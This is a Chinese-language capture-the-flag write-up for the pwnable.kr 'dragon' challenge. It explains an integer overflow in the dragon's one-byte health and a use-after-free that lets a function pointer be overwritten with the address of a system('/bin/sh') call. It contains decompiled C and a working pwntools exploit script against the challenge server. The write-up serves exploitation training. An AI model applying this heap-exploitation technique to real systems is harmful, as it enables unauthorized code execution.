# dragon

要進入到 SecretLevel 才可以拿到  shell


這邊主要看懂code在幹嘛


兩種類型的角色
- priest
    - Holy Bolt會造成20點傷害
    - HolyShield可以讓你暫時無敵
- knight
    - Crash造成 20 點傷害
    - Frenzy可以造成 40 點傷害但也會損失 20 點

龍也有兩種類型
- Baby Dragon
- Mama Dragon

龍的生命只有1個byte，最大生命為127

所以我們可以多試幾次，遇到較弱的龍，然後使用HolyShield和Clarity讓龍治愈自己，直到overflow

在龍死掉後會 free 掉龍的位置，之後又會回到 FightDragon `v2 = malloc(0x10u);`

uaf，記憶體內容會是已經溢出的值，我們可以寫入shell位置進去v2

nn_malloc_2 指標沒有清空，所以會跟 v2 指向到同地方，這樣一呼叫就可以跳上shell

```c
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    (*(void (__cdecl **)(struct_nn_malloc_2 *))&nn_malloc_2->char0)(nn_malloc_2);
```

```python
from pwn import *
rm=remote('pwnable.kr',9004)

for i in range(4):
    rm.sendline('1')  # PriestAttack
for i in range(4):
    rm.sendline('3\n3\n2') # HolyShield HolyShield Clarity

rm.sendline(p32(0x08048DBF)) # system

rm.interactive()
```

```c
int PlayGame()
{
  int nn_result_choice; // eax

  while ( 1 )
  {
    while ( 1 )
    {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      nn_result_choice = GetChoice();
      if ( nn_result_choice != 1 && nn_result_choice != 2 )
        break;
      FightDragon(nn_result_choice);
    }
    if ( nn_result_choice != 3 )
      break;
    SecretLevel();
  }
  return nn_result_choice;
}

unsigned int SecretLevel()
{
  char s1; // [esp+12h] [ebp-16h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Welcome to Secret Level!\nInput Password : ");   
  __isoc99_scanf("%10s", &s1);    // 只吃10 沒辦法填滿好 字串
  if ( strcmp(&s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
  return __readgsdword(0x14u) ^ v2;
}


void __cdecl FightDragon(int nn_result_choice)
{
  char nn_stack_count; // al
  void *v2; // ST1C_4
  int v3; // [esp+10h] [ebp-18h]
  struct_nn_malloc_2 *nn_malloc_1; // [esp+14h] [ebp-14h]
  struct_nn_malloc_2 *nn_malloc_2; // [esp+18h] [ebp-10h]

  nn_malloc_1 = (struct_nn_malloc_2 *)malloc(0x10u);
  nn_malloc_2 = (struct_nn_malloc_2 *)malloc(0x10u);
  nn_stack_count = nn_bssNCount++;
  if ( nn_stack_count & 1 )
  {
    nn_malloc_2->dword4 = 1;
    nn_malloc_2->byte8 = 80;
    nn_malloc_2->byte9 = 4;
    nn_malloc_2->dwordC = 10;
    *(_DWORD *)&nn_malloc_2->char0 = PrintMonsterInfo;
    puts("Mama Dragon Has Appeared!");
  }
  else
  {
    nn_malloc_2->dword4 = 0;
    nn_malloc_2->byte8 = 50;
    nn_malloc_2->byte9 = 5;
    nn_malloc_2->dwordC = 30;
    *(_DWORD *)&nn_malloc_2->char0 = PrintMonsterInfo;
    puts("Baby Dragon Has Appeared!");
  }
  if ( nn_result_choice == 1 )
  {
    *(_DWORD *)&nn_malloc_1->char0 = 1;
    nn_malloc_1->dword4 = 42;
    *(_DWORD *)&nn_malloc_1->byte8 = 50;
    nn_malloc_1->dwordC = PrintPlayerInfo;
    v3 = PriestAttack((int)nn_malloc_1, nn_malloc_2);
  }
  else
  {
    if ( nn_result_choice != 2 )
      return;
    *(_DWORD *)&nn_malloc_1->char0 = 2;
    nn_malloc_1->dword4 = 50;
    *(_DWORD *)&nn_malloc_1->byte8 = 0;
    nn_malloc_1->dwordC = PrintPlayerInfo;
    v3 = KnightAttack((int)nn_malloc_1, nn_malloc_2);
  }
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    (*(void (__cdecl **)(struct_nn_malloc_2 *))&nn_malloc_2->char0)(nn_malloc_2);
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(nn_malloc_1);
}


```